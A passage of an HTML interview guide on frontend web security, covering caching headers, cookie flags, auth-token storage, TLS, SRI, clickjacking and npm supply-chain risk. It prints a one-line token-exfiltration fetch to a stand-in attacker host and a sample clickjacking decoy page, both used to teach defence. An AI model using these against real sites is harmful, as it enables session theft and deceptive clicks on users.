+    <tr><td>Written to disk?</td><td>Yes</td><td>No</td></tr>
+    <tr><td>Network request each time?</td><td>Yes (conditional)</td><td>Yes (full)</td></tr>
+    <tr><td>Can return 304?</td><td>Yes — cheap</td><td>No — always full body</td></tr>
+    <tr><td>Use it for</td><td>HTML that must always be current</td><td>Bank statements, PII, anything on a shared computer</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>The intuition: <code>no-cache</code> is "check with me first." <code>no-store</code> is "don't write this down."</p>
+
+<h3>Validators: ETag and Last-Modified</h3>
+
+<p>When a cached copy goes stale, the browser doesn't blindly re-download — it asks a conditional question.</p>
+
+<pre class="solo"><code>// First response:
+ETag: "a3f5c891"
+Last-Modified: Wed, 12 Aug 2026 10:30:00 GMT
+
+// Later, browser asks:
+If-None-Match: "a3f5c891"
+If-Modified-Since: Wed, 12 Aug 2026 10:30:00 GMT
+
+// Server: unchanged →
+HTTP/1.1 304 Not Modified          // 👈 no body. Headers only.</code></pre>
+
+<p>An <strong>ETag</strong> is an opaque fingerprint of the content — often a content hash. Exact, and works for content that changes more than once per second. A <strong>Last-Modified</strong> date is coarser (one-second resolution) and can be wrong if a file is touched without changing. ETag wins where both are present.</p>
+
+<p>The <strong>304</strong> is the payoff: a few hundred bytes of headers instead of a 200KB payload. You still pay the round trip, which is why <code>max-age</code> (no request at all) beats revalidation when you can use it.</p>
+
+<h3>The pattern that makes all of this easy</h3>
+
+<p>Here's the setup basically every modern frontend build uses, and it's worth being able to describe:</p>
+
+<pre class="solo"><code>index.html          →  Cache-Control: no-cache
+app.4f3a9b2c.js     →  Cache-Control: public, max-age=31536000, immutable
+logo.8e1d0f7a.svg   →  Cache-Control: public, max-age=31536000, immutable</code></pre>
+
+<p>The trick is the hash in the filename. Because the name is derived from the contents, a changed file gets a <em>different name</em> — so you can cache it forever with zero risk of serving something stale. There's no invalidation problem, because you never overwrite anything; you just publish new names.</p>
+
+<p>The HTML is the one file with a fixed name, so it's the one that must always be checked. <code>no-cache</code> makes it revalidate on every load — cheap, usually a 304 — and when it does change, it points at the new hashed filenames. One small conditional request unlocks a fully-cached deploy. That's the whole design, and it's elegant.</p>
+
+<h3>The security angle</h3>
+
+<p>Now the bit that belongs in a security guide.</p>
+
+<p>A <strong>shared cache</strong> — a CDN, a corporate proxy — stores one copy and serves it to many people. If an authenticated, personalised response ends up in a shared cache, the next person to request that URL gets <em>someone else's data</em>. This is a real and recurring class of incident; it takes down real companies.</p>
+
+<div class="label bad">❌ Buggy</div>
+<pre><code>GET /api/me  →  200 OK
+Cache-Control: max-age=300      // 👈 no 'private'. A CDN may store this.
+{ "email": "sam@example.com", "role": "admin" }</code></pre>
+
+<div class="label good">✅ Fixed</div>
+<pre><code>GET /api/me  →  200 OK
+Cache-Control: private, no-store
+Vary: Cookie, Authorization</code></pre>
+
+<p>Rules of thumb:</p>
+
+<ul>
+  <li>Anything personalised gets <code>private</code> at minimum. Anything sensitive gets <code>no-store</code>.</li>
+  <li><code>Vary: Cookie</code> (and <code>Authorization</code>) tells caches the response depends on who's asking. Without <code>Vary</code>, a cache keys purely on the URL and cheerfully mixes users up. Same principle as <code>Vary: Origin</code> in the CORS section.</li>
+  <li>After logout, the previous user's pages shouldn't be recoverable with the back button — <code>no-store</code> on authenticated HTML handles that.</li>
+  <li>Be careful with CDN configs that "cache everything" or strip cookies to improve hit rates. That's exactly how these incidents happen.</li>
+</ul>
+
+<h2 id="cookies"><span class="num">Part 9</span>Cookie attributes, one at a time</h2>
+
+<p>We've leaned on cookies for two whole sections. Let's give them their own, because every attribute on a <code>Set-Cookie</code> line is a security decision, and interviewers ask you to enumerate them.</p>
+
+<pre class="solo"><code>Set-Cookie: __Host-session=abc123; HttpOnly; Secure; SameSite=Lax;
+            Path=/; Max-Age=1800</code></pre>
+
+<h4><code>HttpOnly</code></h4>
+
+<p>The cookie becomes <strong>invisible to JavaScript</strong>. <code>document.cookie</code> won't show it. No API can read it. It's attached to requests by the browser and that's the only way it's ever used.</p>
+
+<p>This is the single most important attribute for a session cookie, and it's the main structural mitigation against XSS: if an attacker gets script running in your origin, they still cannot read or exfiltrate the session token. It doesn't stop them <em>using</em> the session — more on that shortly — but stealing a token that works from the attacker's own machine for weeks is much worse than acting inside a page the user might close.</p>
+
+<h4><code>Secure</code></h4>
+
+<p>Only sent over HTTPS. Without it, a single accidental <code>http://</code> request — a typed URL, an old bookmark, an injected link — sends the session token in plaintext across the network, where anyone on the path can read it. Always set it. (Localhost is exempted by browsers so development still works.)</p>
+
+<h4><code>SameSite</code></h4>
+
+<p>Covered in the CSRF section: <code>Lax</code> as a sane default, <code>Strict</code> for high-value with a UX cost, <code>None</code> (requires <code>Secure</code>) only when you genuinely need cross-site sending.</p>
+
+<h4><code>Domain</code> and <code>Path</code> — the scope, and the subdomain risk</h4>
+
+<p>This is the subtle one. <code>Domain</code> controls which hosts get the cookie, and the rule surprises people:</p>
+
+<ul>
+  <li><strong>Omit <code>Domain</code></strong> → host-only. Set by <code>app.example.com</code>, sent only to <code>app.example.com</code>. This is the tighter, safer option.</li>
+  <li><strong><code>Domain=example.com</code></strong> → sent to <code>example.com</code> <em>and every subdomain</em>: <code>app.</code>, <code>api.</code>, <code>blog.</code>, <code>marketing-campaign-2019.</code>, and whatever the growth team spins up next week.</li>
+</ul>
+
+<p>See the problem? A domain-wide session cookie is handed to every subdomain, including ones running third-party software, a legacy CMS, a status page, or a customer-controlled vanity host. XSS on the least important subdomain you own becomes session theft for your main app. And the risk runs the other way too: a compromised subdomain can <em>write</em> cookies that your main app will read, which is exactly how the double-submit CSRF pattern gets undermined.</p>
+
+<p><strong>Default to omitting <code>Domain</code>.</strong> Only widen the scope when you actually need cross-subdomain sessions, and then treat every subdomain as part of your security perimeter.</p>
+
+<p><code>Path=/admin</code> restricts by URL path, but treat it as organisation rather than security — same-origin JS can read across paths, and it's easy to work around.</p>
+
+<h4><code>Expires</code> / <code>Max-Age</code> vs session cookies</h4>
+
+<p>No <code>Expires</code> and no <code>Max-Age</code> means a <strong>session cookie</strong>: gone when the browser closes. Feels secure, but it's soft — "session restore" features in every major browser routinely bring them back.</p>
+
+<p><code>Max-Age=1800</code> (seconds, relative — preferred) or <code>Expires=<em>date</em></code> (absolute, depends on the client's clock being right) creates a <strong>persistent cookie</strong> that survives restarts. That's the "remember me" experience.</p>
+
+<p>Either way, <strong>the real expiry must be enforced server-side.</strong> A cookie's lifetime is a hint to the browser; the session's lifetime is a fact in your database. Deleting the cookie doesn't invalidate anything — logout must revoke server-side.</p>
+
+<h4>The <code>__Host-</code> and <code>__Secure-</code> prefixes</h4>
+
+<p>A lovely trick, and mentioning it in an interview is a genuine flex because most people have never heard of it.</p>
+
+<p>The problem: cookie attributes aren't visible on the way <em>in</em>. Your server receives <code>Cookie: session=abc</code> and has no idea whether that cookie was set with <code>Secure</code>, or by which host. So a network attacker on plain HTTP, or a compromised subdomain, can overwrite your carefully-configured cookie with a sloppy one and you can't tell.</p>
+
+<p>The prefixes fix that by putting the requirement <em>in the name</em>, and browsers enforce it at set time:</p>
+
+<ul>
+  <li><code>__Secure-</code> prefix → the browser rejects the <code>Set-Cookie</code> unless it has <code>Secure</code> and came from a secure origin.</li>
+  <li><code>__Host-</code> prefix → requires <code>Secure</code>, requires <code>Path=/</code>, and <strong>forbids <code>Domain</code></strong>. So a <code>__Host-</code> cookie is guaranteed host-only: no subdomain can set it, and no subdomain receives it.</li>
+</ul>
+
+<p>Because the guarantee is carried in the name, and the name <em>is</em> sent to the server, seeing <code>__Host-session</code> arrive tells you it was set securely and host-scoped. Free integrity, one rename. Use <code>__Host-</code> for session cookies whenever you don't need cross-subdomain sharing.</p>
+
+<h2 id="storage"><span class="num">Part 10</span>Where do I put the auth token?</h2>
+
+<p>This is the question. It comes up in almost every frontend interview that touches auth, and it's designed to see whether you can reason about trade-offs or whether you just repeat what a tutorial told you.</p>
+
+<p>The trap is that there's no answer that's simply "safe." Every option trades one attack for another. So let's lay them out honestly.</p>
+
+<h3>Option A: localStorage</h3>
+
+<pre class="solo"><code>localStorage.setItem('token', accessToken);
+// later
+headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }</code></pre>
+
+<p><strong>The good:</strong> dead simple. Survives refresh and tab close. Works across ports and any client (mobile apps do the same thing). And — genuinely — <strong>immune to CSRF</strong>, because nothing is ambient: your code must explicitly attach it, and an attacker's page can't run your code.</p>
+
+<p><strong>The bad, and it's very bad:</strong> localStorage is readable by <em>any</em> JavaScript on your origin. That includes injected script, and it includes any of your 900 transitive npm dependencies. So <strong>any XSS is total account compromise</strong>: one line, <code>fetch('//evil.example?t=' + localStorage.token)</code>, and the attacker has a token they can use from their own machine, from anywhere, until it expires. No browser needed. Your logs will show it as a legitimate authenticated user.</p>
+
+<p>It's also readable by anything with DOM access, has no expiry mechanism of its own, and is shared across all tabs.</p>
+
+<h3>Option B: HttpOnly cookies</h3>
+
+<pre class="solo"><code>Set-Cookie: __Host-session=abc; HttpOnly; Secure; SameSite=Lax; Path=/</code></pre>
+
+<p><strong>The good:</strong> JavaScript literally cannot read it. XSS <strong>cannot exfiltrate the token</strong> — that's a real, meaningful reduction in blast radius. Sent automatically, so no client-side plumbing. Server controls the lifetime and can revoke.</p>
+
+<p><strong>The bad:</strong> it's ambient, so <strong>you must handle CSRF</strong> — SameSite plus tokens plus origin checks, as above. Cross-domain setups (API on a different registrable domain) require <code>SameSite=None</code>, CORS with credentials, and care. And there's a nuance people miss:</p>
+
+<div class="callout myth">
+  <span class="ctitle">A common misconception — "HttpOnly means XSS doesn't matter"</span>
+  <p>It really doesn't. <code>HttpOnly</code> stops the attacker from <em>reading</em> the token. It does nothing to stop them from <em>using</em> it.</p>
+  <p>Injected script can still call <code>fetch('/api/transfer', { method: 'POST', credentials: 'include', … })</code> — and the browser will attach the HttpOnly cookie, because the request is same-origin and that's what cookies do. The attacker never sees the token and doesn't need to. They can perform any action the user can, read any data the API returns, and script an entire session inside the victim's browser.</p>
+  <p>What HttpOnly changes is <strong>persistence and portability</strong>: the attacker is confined to the victim's browser while the page is open, rather than walking away with a credential they can replay from a server in another country for the next 30 days. That's a big win. It is not immunity.</p>
+</div>
+
+<h3>Option C: in memory only</h3>
+
+<pre class="solo"><code>let accessToken = null;   // 👈 a module-scoped variable. That's it.</code></pre>
+
+<p><strong>The good:</strong> nothing on disk, so it's the safest <em>at rest</em>. Nothing survives a tab close. Immune to CSRF. Not readable by another tab.</p>
+
+<p><strong>The bad:</strong> gone on every refresh, which means a logged-out-looking app every time someone hits F5 — unacceptable UX unless you can silently get a new one. Which means a refresh token, which has to live <em>somewhere</em>, which is the same problem one level down. And XSS on the page can still read a JS variable — it's not magic, just not persistent.</p>
+
+<h3>The consensus answer</h3>
+
+<p>Here's where the industry has landed, and it's the answer I'd give:</p>
+
+<ol>
+  <li><strong>A short-lived access token</strong> (5–15 minutes) held <strong>in memory</strong>, or in a cookie.</li>
+  <li><strong>A refresh token in an <code>HttpOnly; Secure; SameSite=Lax</code> cookie</strong>, scoped with <code>Path=/auth/refresh</code> so it's only sent to the one endpoint that needs it, and named with <code>__Host-</code>.</li>
+  <li><strong>Refresh token rotation</strong>: every refresh issues a new one and invalidates the old. If a stolen token is replayed, the server sees a used token and can revoke the whole family — so theft becomes <em>detectable</em>, not just possible.</li>
+  <li><strong>CSRF defences</strong> on the cookie-authenticated endpoints, because you're using cookies.</li>
+  <li><strong>Server-side revocation</strong>, so logout and "sign out everywhere" actually do something.</li>
+</ol>
+
+<p>You get the short exposure window of in-memory tokens, the exfiltration resistance of HttpOnly, and refresh-on-load UX. The cost is more moving parts.</p>
+
+<p>And be honest about when a plain bearer token is fine: a public API with no cookie auth at all, a mobile or desktop client where there's no browser and no CSRF concept, a third-party API consumed cross-domain where cookies are painful, or a low-stakes internal tool where the simplicity genuinely wins. The wrong answer isn't "localStorage" — it's picking either one without being able to say what you gave up.</p>
+
+<div class="interview">
+  <span class="ctitle">In an interview — CSP, caching, cookies &amp; token storage</span>
+
+  <h4>How it gets asked</h4>
+  <p>"localStorage or cookies for a JWT?" · "If you use HttpOnly cookies, does XSS stop mattering?" · "What's the difference between <code>no-cache</code> and <code>no-store</code>?" · "What cookie flags would you set on a session cookie and why?" · "How would you roll out a CSP to an existing app?"</p>
+
+  <div class="say">
+    <span class="tag">Model answer — "localStorage or cookies for a JWT?"</span>
+    <p>"It's a trade between XSS and CSRF, so I'd start by asking what the app does. localStorage is immune to CSRF because the token is only ever attached explicitly by my code — but it's readable by any script on the origin, so a single XSS anywhere, including in a dependency, means the token walks out the door and works from the attacker's machine until it expires.</p>
+    <p>An <code>HttpOnly; Secure; SameSite</code> cookie can't be read by JavaScript at all, so XSS can't exfiltrate it — though it can still act as the user inside the page, so it's a reduction in blast radius, not immunity. The cost is that I have to handle CSRF.</p>
+    <p>For a browser app handling anything valuable I'd go with cookies: a short-lived access token, a refresh token in an <code>HttpOnly</code>, <code>__Host-</code> prefixed cookie scoped to the refresh endpoint, rotation on every use so replay is detectable, and CSRF tokens on state-changing routes. A bearer token in storage is the pragmatic choice for a mobile client or a cross-domain third-party API, where cookies don't fit."</p>
+  </div>
+
+  <p><strong>Why this lands:</strong> you framed it as a trade rather than picking a winner, you correctly limited what HttpOnly buys you, and you gave a concrete architecture with rotation. Most candidates say "cookies are more secure" and can't say why.</p>
+
+  <h4>Follow-up: "If you use HttpOnly cookies, does XSS stop mattering?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"No. It stops the attacker <em>reading</em> the token, not <em>using</em> it. Injected script can still fire authenticated requests from the page — the browser attaches the cookie automatically — so they can do anything the user can and read anything the API returns. What changes is portability and duration: they're stuck inside that browser session rather than holding a credential they can replay from anywhere for weeks. Worth having, absolutely. Not a reason to deprioritise fixing the XSS."</p>
+  </details>
+
+  <h4>Follow-up: "<code>no-cache</code> vs <code>no-store</code>?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"<code>no-cache</code> is badly named — it does cache. It means 'store it, but revalidate with the server before every use,' so with an ETag you usually get a cheap 304 and skip re-downloading the body. <code>no-store</code> is the literal one: never write it to disk or memory anywhere, full download every time. I'd use <code>no-cache</code> on <code>index.html</code> so deploys are picked up immediately, and <code>no-store</code> on anything genuinely sensitive — bank statements, PII — especially so it can't be recovered from a shared machine after logout."</p>
+  </details>
+
+  <h4>Follow-up: "How do you cache aggressively without serving stale code?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"Content-hashed filenames. Assets get a hash of their contents in the name and <code>max-age=31536000, immutable</code>, so they're cached forever and never need invalidating — a change produces a new filename. The HTML keeps a stable name and gets <code>no-cache</code>, so it revalidates on every load and points at whatever the current hashed assets are. One small conditional request unlocks a fully cached deploy."</p>
+  </details>
+
+  <h4>Follow-up: "Why is a shared cache a security concern?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"Because a CDN or proxy stores one copy keyed on the URL and serves it to everyone. If a personalised authenticated response gets stored there, the next requester gets someone else's data. So authenticated responses need <code>private</code> at minimum, <code>no-store</code> if sensitive, and <code>Vary: Cookie</code> so any cache knows the response depends on who's asking."</p>
+  </details>
+
+  <h4>Trap</h4>
+  <div class="trap"><span class="t">Wrong:</span> "JWTs are stateless, so we don't need server-side session storage — that's the whole point." True in theory, and then someone asks how you log a user out or revoke a stolen token, and the honest answer is you can't until it expires. <br><span class="t">Say instead:</span> "Stateless access tokens are great for scale, but revocation needs state somewhere — short expiry plus a refresh token you can revoke, or a denylist. I'd name that trade rather than pretend it's free."</div>
+</div>
+
+<h2 id="tls"><span class="num">Part 11</span>HTTPS/TLS and why the frontend cares</h2>
+
+<p>"Use HTTPS" is advice so universal it's become background noise. Let's make it concrete, because there's a specific reason a <em>frontend</em> engineer should care, and it connects directly back to XSS.</p>
+
+<h3>What plain HTTP actually looks like</h3>
+
+<p>An HTTP request is plain text travelling through a chain of machines you don't control: the café's router, the ISP, several backbone hops, a hosting provider's load balancer. Every one of them can read the bytes. And — this is the part people underweight — every one of them can <strong>change</strong> the bytes.</p>
+
+<p>So over HTTP, an intermediary can inject a <code>&lt;script&gt;</code> tag into your HTML on the way to the user. Not steal a cookie: <em>inject code into your origin</em>. Every defence we built in the XSS section assumes the HTML that arrives is the HTML you sent. Over HTTP that assumption is false, and there's nothing you can do about it in application code. ISPs have genuinely done this to inject ads; hostile networks have done it to inject exploits.</p>
+
+<p>TLS gives you three things:</p>
+
+<ul>
+  <li><strong>Confidentiality</strong> — the traffic is encrypted, so intermediaries see only which host you connected to, not the URLs, headers, cookies, or bodies.</li>
+  <li><strong>Integrity</strong> — the content is authenticated, so tampering is detected and the connection fails rather than silently delivering modified code.</li>
+  <li><strong>Authentication</strong> — you're actually talking to the server that owns that domain, not something impersonating it.</li>
+</ul>
+
+<p>Integrity is the one that matters most for frontend security, and it's the one people mention least.</p>
+
+<h3>The handshake, conceptually</h3>
+
+<p>You don't need the cryptography, but you should be able to sketch the shape:</p>
+
+<ol>
+  <li>Your browser says hello and lists the cipher suites it supports.</li>
+  <li>The server replies with its <strong>certificate</strong> — a document containing its domain name and public key, digitally signed by a <strong>Certificate Authority</strong>.</li>
+  <li>Your browser checks that signature against the list of CAs it trusts (shipped with your OS/browser), checks the certificate hasn't expired or been revoked, and checks the domain name matches the one you asked for.</li>
+  <li>Using asymmetric crypto, both sides agree on a shared <em>symmetric</em> key that only they know. Everything after that is encrypted with it, because symmetric crypto is much faster.</li>
+</ol>
+
+<p>The mental model: the certificate is a <strong>passport</strong>. The server hands it over, and the CA is the government that issued it. Your browser trusts the passport because it recognises the issuing authority's signature — not because it knows the server personally. Where it breaks down: if a government issues a fraudulent passport, everything downstream believes it. That's why CA compromises are a big deal, and why Certificate Transparency logs exist.</p>
+
+<h3>HSTS: closing the first-visit gap</h3>
+
+<p>You have HTTPS. But a user types <code>example.com</code> into the address bar with no scheme. The browser tries <code>http://</code>, you send a 301 to <code>https://</code>, and everything's fine — except that first request went out in the clear, and an attacker on the network could have intercepted it and kept the user on HTTP forever (an "SSL stripping" attack), quietly proxying the site while reading everything.</p>
+
+<p><strong>HTTP Strict Transport Security</strong> closes that:</p>
+
+<pre class="solo"><code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code></pre>
+
+<p>Once the browser sees this over a valid HTTPS connection, it remembers for a year: <em>never use HTTP for this domain</em>. It rewrites <code>http://</code> to <code>https://</code> internally, before any request leaves. It also refuses to let users click through certificate warnings.</p>
+
+<p><code>includeSubDomains</code> covers everything under the domain. <code>preload</code> asks to be baked into a list shipped inside browsers, which closes even the very first visit. Preload is close to irreversible — deploy it only when you're certain every subdomain, forever, can do HTTPS.</p>
+
+<h3>Mixed content</h3>
+
+<p>An HTTPS page that loads an HTTP subresource has a hole in it, so browsers intervene:</p>
+
+<ul>
+  <li><strong>Active mixed content</strong> — scripts, stylesheets, iframes, XHR/fetch. <strong>Blocked outright.</strong> These can control the page, so an injected version is game over.</li>
+  <li><strong>Passive mixed content</strong> — images, video, audio. Historically allowed with a downgraded padlock; browsers now auto-upgrade to HTTPS and block if that fails. Less catastrophic (you'd just see a wrong image), but still leaks which resources you're loading.</li>
+</ul>
+
+<p>Practical note: this is one of the most common "it works locally, it's broken in production" bugs. A hardcoded <code>http://</code> URL, or an API returning absolute HTTP URLs for images. <code>Content-Security-Policy: upgrade-insecure-requests</code> is a good migration crutch.</p>
+
+<h3>Secure contexts — features that simply don't exist on HTTP</h3>
+
+<p>Here's the pragmatic reason you'll hit this even on a hobby project. Browsers gate powerful APIs behind a <strong>secure context</strong> (HTTPS, or localhost for development):</p>
+
+<ul>
+  <li><strong>Service workers</strong> — and therefore PWAs, offline support, background sync. A service worker can intercept every request for your origin; over HTTP, an attacker could install a permanent one.</li>
+  <li><strong>Geolocation</strong>, camera and microphone (<code>getUserMedia</code>), notifications</li>
+  <li><strong>Web Crypto</strong> (<code>crypto.subtle</code>)</li>
+  <li><strong>Credential Management / WebAuthn</strong> (passkeys), Payment Request</li>
+  <li>HTTP/2 and HTTP/3, which every browser only does over TLS</li>
+</ul>
+
+<p>So "we'll add HTTPS later" isn't only a security decision — half the modern platform is switched off without it.</p>
+
+<h2 id="sri"><span class="num">Part 12</span>Subresource Integrity</h2>
+
+<p>You load a library from a CDN:</p>
+
+<pre class="solo"><code>&lt;script src="https://cdn.example.com/chart-lib@4.2.0/dist/chart.min.js"&gt;&lt;/script&gt;</code></pre>
+
+<p>HTTPS guarantees nobody tampered with the file <em>in transit</em>. But it guarantees nothing about the file <strong>at the source</strong>. If that CDN is compromised, or an account there is taken over, or a maintainer replaces the file, you are executing whatever they now serve — with full privileges on your origin. HTTPS will faithfully and securely deliver the malicious version.</p>
+
+<p><strong>Subresource Integrity</strong> lets you pin the expected contents:</p>
+
+<pre class="solo"><code>&lt;script
+  src="https://cdn.example.com/chart-lib@4.2.0/dist/chart.min.js"
+  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+  crossorigin="anonymous"&gt;&lt;/script&gt;</code></pre>
+
+<p>The browser downloads the file, hashes it, and compares. If it doesn't match — one byte different — the resource is <strong>not executed</strong>. It fails as if it never loaded.</p>
+
+<p>Two things to know:</p>
+
+<p><strong>Why <code>crossorigin</code> is required.</strong> To hash the file, the browser needs the full response body. Normally a cross-origin script is loaded "opaquely" — it executes but your page can't inspect its contents. <code>crossorigin="anonymous"</code> switches it to a CORS-mode request (without credentials), which means the CDN must send <code>Access-Control-Allow-Origin</code>. Nice little callback: SRI depends on CORS. Without <code>crossorigin</code>, the check can't run and the script is blocked.</p>
+
+<p><strong>The limits.</strong> SRI pins one exact file, so:</p>
+
+<ul>
+  <li>It <strong>breaks on any legitimate update</strong>. Point at a floating version like <code>@latest</code> and your site dies the moment they publish. That's arguably a feature — you should be pinning exact versions anyway — but it means SRI is a build-time commitment, not fire-and-forget.</li>
+  <li>It's <strong>useless for dynamic endpoints</strong>. An API response, a personalised script, anything that changes per user has no stable hash to pin.</li>
+  <li>It only covers what you wrote the tag for. If the pinned script then loads <em>more</em> scripts at runtime, those aren't covered.</li>
+  <li>It doesn't help if the file was malicious when you generated the hash. SRI guarantees "the same file I checked," not "a safe file."</li>
+</ul>
+
+<h2 id="clickjacking"><span class="num">Part 13</span>Clickjacking</h2>
+
+<p>A different shape of attack, and a fun one to explain because the mechanism is so physical.</p>
+
+<p>The attacker builds a page that says something innocuous — "Click here to claim your prize." Underneath the button, they load <em>your</em> site in an iframe, positioned so that your "Delete account" or "Transfer funds" or "Authorise this app" button sits exactly where the decoy button appears. Then they set <code>opacity: 0</code> on the iframe.</p>
+
+<pre class="solo"><code>&lt;style&gt;
+  iframe { position: absolute; top: -220px; left: -50px;
+           opacity: 0;              /* 👈 invisible, but still clickable */
+           z-index: 2; }
+  button { position: absolute; top: 100px; left: 100px; z-index: 1; }
+&lt;/style&gt;
+&lt;button&gt;Claim your prize 🎁&lt;/button&gt;
+&lt;iframe src="https://app.example.com/settings"&gt;&lt;/iframe&gt;</code></pre>
+
+<p>The user sees the decoy. They click. The click lands on the invisible iframe — <strong>your real site</strong>, with the user's real session, doing a real thing they intended to do to something else entirely.</p>
+
+<p>It's a <strong>glass pane over a form</strong>. You think you're signing the paper in front of you; your pen is actually marking the document underneath.</p>
+
+<p>What makes this awkward is that nothing is technically forged. The click is real. The session is real. The request is real and same-origin from the iframe's perspective. CSRF tokens don't help — the page in the frame is your own page, with your own token in it. SameSite doesn't fully help either, depending on configuration. The only real defence is <strong>refusing to be framed</strong>.</p>
+
+<h4>The modern way: <code>frame-ancestors</code></h4>
+
+<pre class="solo"><code>Content-Security-Policy: frame-ancestors 'none'
+
+// or, to allow specific embedders:
+Content-Security-Policy: frame-ancestors 'self' https://partner.example.com</code></pre>
+
+<p>This is the CSP directive that says who may embed your page. It supports multiple origins and wildcards, and it's the one to reach for now.</p>
+
+<h4>The legacy way: <code>X-Frame-Options</code></h4>
+
+<pre class="solo"><code>X-Frame-Options: DENY          // nobody may frame this
+X-Frame-Options: SAMEORIGIN    // only my own origin may</code></pre>
+
+<p>Older, less flexible — its <code>ALLOW-FROM</code> variant was never properly supported, so it's effectively all-or-same-origin. Still worth sending alongside <code>frame-ancestors</code> for ancient clients. Where both are present, browsers that understand <code>frame-ancestors</code> use it and ignore the older header.</p>
+
+<h4>Framebusting (legacy, don't rely on it)</h4>
+
+<p>Before those headers existed, sites shipped JavaScript like:</p>
+
+<div class="label bad">❌ Legacy — don't use this as your defence</div>
+<pre><code>if (window.top !== window.self) {
+  window.top.location = window.self.location;   // 👈 escape the frame
+}</code></pre>
+
+<p>It's been comprehensively defeated: <code>sandbox</code> on the iframe can block the navigation, attackers can intercept <code>beforeunload</code>, and it fails entirely with JS disabled. Know it exists so you can explain why it's not the answer; use headers.</p>
+
+<p>A related note worth having: <code>rel="noopener"</code> on <code>target="_blank"</code> links. Without it, the page you open gets a <code>window.opener</code> reference and can navigate your tab to a phishing clone while the user is looking elsewhere ("tabnabbing"). Modern browsers imply <code>noopener</code> by default now, but it's cheap to be explicit, and pairing it with <code>noreferrer</code> also stops leaking your URL.</p>
+
+<h2 id="supplychain"><span class="num">Part 14</span>The supply chain problem</h2>
+
+<p>One last thing, and it's the one that keeps security people up at night.</p>
+
+<p>Run <code>npm ls --all</code> on a typical React app. You'll find somewhere between 800 and 1,500 packages. You chose maybe 20 of them. The rest arrived as dependencies of dependencies, written by people you've never heard of, and updated without you noticing.</p>
+
+<p>Now the uncomfortable bit: <strong>every one of those packages runs with your application's full privileges.</strong> There is no sandbox. A date-formatting utility buried four levels deep has exactly the same access as your own code: it can read <code>localStorage</code>, read the DOM, read what the user typed into the password field, and <code>fetch</code> anywhere your CSP allows. JavaScript modules have no permission system.</p>
+
+<p>And some of them run on <em>your machine</em>, at install time, via lifecycle scripts, with your shell's privileges and your environment variables — including whatever secrets are in your CI.</p>
+
+<p>This isn't hypothetical. <code>event-stream</code> (2018): a maintainer handed the project to a helpful stranger, who added a payload targeting a specific Bitcoin wallet. <code>ua-parser-js</code> (2021): maintainer account compromised, malware published for a few hours, and it had tens of millions of weekly downloads. Then there's typosquatting (<code>lodahs</code>), dependency confusion (publishing a public package with your internal package's name so the resolver prefers it), and protestware where a maintainer deliberately breaks their own package.</p>
+
+<p><strong>Why this is a frontend problem specifically:</strong> your dependencies get <em>bundled and shipped to every user's browser</em>, where they execute inside your origin, next to your session. A backend compromise is bad; a frontend supply chain compromise is XSS distributed to your entire user base, signed and served by you.</p>
+
+<h3>What you actually do about it</h3>
+
+<ul>
+  <li><strong>Commit your lockfile, and use <code>npm ci</code> in CI.</strong> This is the highest-value, lowest-effort item on the list: it makes builds reproducible and stops a caret range from silently pulling a new version at 3am.</li>
+  <li><strong>Audit regularly</strong> — <code>npm audit</code>, Dependabot, Snyk. Noisy, yes; triage anyway. Pay disproportionate attention to anything that ships to the browser.</li>
+  <li><strong>Count before you install.</strong> Does this need to be a dependency, or is it 15 lines? Prefer packages with few transitive deps, recent activity, and more than one maintainer.</li>
+  <li><strong>Disable install scripts where you can</strong> (<code>npm config set ignore-scripts true</code>) and allowlist the few that genuinely need them.</li>
+  <li><strong>Pin exact versions</strong> for critical dependencies rather than living on <code>^</code>.</li>
+  <li><strong>Use SRI on anything from a CDN</strong>, per the previous section.</li>
+  <li><strong>Lock down <code>connect-src</code> in your CSP.</strong> This is the underrated one: even if a compromised dependency runs, a tight <code>connect-src</code> means it can't send the data it stole anywhere. It converts a breach into a nuisance.</li>
+  <li><strong>Review lockfile diffs in PRs.</strong> A one-line dependency bump that adds 40 transitive packages deserves a second look.</li>
+</ul>
+
+<p>In an interview, "dependency hygiene is part of frontend security because bundled code runs with full privileges in my users' browsers" is a sentence that makes you sound like someone who has shipped things.</p>
+
+<h2 id="cheatsheet"><span class="num">Part 15</span>Interview cheat sheet</h2>
+
+<p>The morning-of version. One crisp line each.</p>
+
+<div class="cheat">
+<dl>
+  <dt>Origin</dt>
+  <dd>Scheme + host + port. All three must match. Subdomains are different origins; the path is irrelevant.</dd>
+
+  <dt>Same-Origin Policy</dt>
+  <dd>Script from origin A can't <em>read</em> responses from origin B. It doesn't stop the request being sent, and it doesn't apply to <code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;link&gt;</code> or form posts.</dd>
+
+  <dt>CORS</dt>
+  <dd>A way for a server to <em>relax</em> SOP for named origins. Browser-enforced, server-declared. Protects users, not servers.</dd>
+
+  <dt>Preflight</dt>
+  <dd>An <code>OPTIONS</code> request the browser sends first, for anything beyond GET/POST/HEAD with safelisted headers and a form-ish content type. JSON content-type triggers it.</dd>
+
+  <dt>Does CORS protect my API?</dt>
+  <dd>No. Only browsers enforce it. curl, Postman, scripts, mobile apps ignore it. Authn/authz must be server-side.</dd>
+
+  <dt>Why does Postman work but the browser doesn't?</dt>
+  <dd>Postman isn't a browser, so nothing enforces CORS. The server was always responding; the browser is withholding the response from your JS.</dd>
+
+  <dt>Can you fix CORS from the frontend?</dt>
+  <dd>No — <code>Origin</code> is a forbidden header and <code>no-cors</code> just gives you an unreadable opaque response. Fix the server, or remove the cross-origin-ness with a dev proxy / BFF / same-origin routing.</dd>
+
+  <dt>Why can't <code>*</code> be used with credentials?</dt>
+  <dd>Because a credentialed response is personalised, and <code>*</code> would let <em>any</em> site read it. Echo a specific allowlisted origin and add <code>Vary: Origin</code>.</dd>
+
+  <dt>XSS</dt>
+  <dd>Attacker data gets interpreted as code inside your origin, inheriting the DOM, non-HttpOnly cookies, storage, and the ability to make authenticated requests.</dd>
+
+  <dt>Stored / reflected / DOM-based</dt>
